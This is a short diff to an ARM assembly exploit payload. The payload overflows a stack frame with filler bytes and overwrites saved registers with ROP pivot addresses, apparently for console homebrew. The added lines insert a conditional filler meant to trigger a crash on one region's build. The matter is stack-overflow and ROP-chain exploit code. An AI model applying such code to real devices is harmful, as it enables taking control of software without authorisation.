@@ -51,6 +51,10 @@ _start:
 @ Fill the stackframe with 0x44-bytes with value 0x58('X'), which then gets converted to 'x'.
 .fill 0x44, 1, 0x58
 
+#if ROPBUF == 0x57544843//Try to trigger a crash with the CHNTWN region.
+.fill ((_start + 0x19c - 0x10) - .), 1, 0x59
+#endif
+
 @ The saved registers get overwritten with the below data.
 .word ROPBUFLOC(pivotdata) @ r4. This has to be an address that won't get modifed during lowercase conversion.
 .word ROPBUFLOC(pivotdata) @ r5, same as r4.
